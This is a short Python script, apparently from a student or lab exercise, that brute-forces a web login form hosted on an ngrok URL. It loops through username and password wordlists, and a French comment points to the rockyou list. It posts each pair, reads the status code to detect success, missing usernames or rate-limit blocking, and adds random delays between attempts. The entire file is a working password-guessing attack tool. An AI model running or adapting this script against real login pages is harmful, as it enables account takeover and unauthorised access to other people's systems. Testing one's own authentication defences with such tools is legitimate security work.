import requests
import time
import random

url = "https://accurate-actively-fox.ngrok-free.app/login"  
username_file = "usernames.txt" 
password_file = "test.txt"  #### tester avec rockyou.txt ( téléchargé juste en local , sur git il ne passe pas )
#https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt&ved=2ahUKEwiGkKj29omKAxWPVaQEHa-fIv0QFnoECA0QAQ&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd
with open(username_file, "r", encoding="utf-8") as uf:
    usernames = uf.read().splitlines()

with open(password_file, "r", encoding="utf-8", errors="ignore") as pf:
    for username in usernames:
        pf.seek(0)  
        for password in pf:
            password = password.strip()  
            print(f"Testing {username} / {password}...")

            try:
                response = requests.post(url, data={"username": username, "password": password}, allow_redirects=False)
                print(f"Status Code: {response.status_code}")

                if response.status_code == 302:
                    print("Redirected: Login successful!")
                    exit(0)  
                elif response.status_code == 401:
                    print("Unauthorized: Invalid password.")
                elif response.status_code == 404:
                    print("Not Found: Username does not exist.")
                elif response.status_code == 429:
                    print("Too Many Requests: User is temporarily blocked.")
                else:
                    print(f"Unexpected response: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")

            time.sleep(random.uniform(0.5, 1.5))
